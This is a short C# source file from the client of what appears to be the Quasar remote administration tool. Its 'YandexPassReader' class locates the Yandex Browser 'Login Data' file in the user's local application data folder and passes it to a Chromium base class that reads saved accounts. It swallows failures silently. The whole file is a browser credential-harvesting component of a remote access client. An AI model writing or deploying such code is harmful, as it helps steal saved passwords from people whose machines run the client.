﻿using Quasar.Common.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace Quasar.Client.Recovery.Browsers
{
    public class YandexPassReader : ChromiumBase
    {
        /// <inheritdoc />
        public override string ApplicationName => "Yandex";

        /// <inheritdoc />
        public override IEnumerable<RecoveredAccount> ReadAccounts()
        {
            try
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Yandex\\YandexBrowser\\User Data\\Default\\Login Data");
                return ReadAccounts(filePath, null, ApplicationName);
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }
    }
}
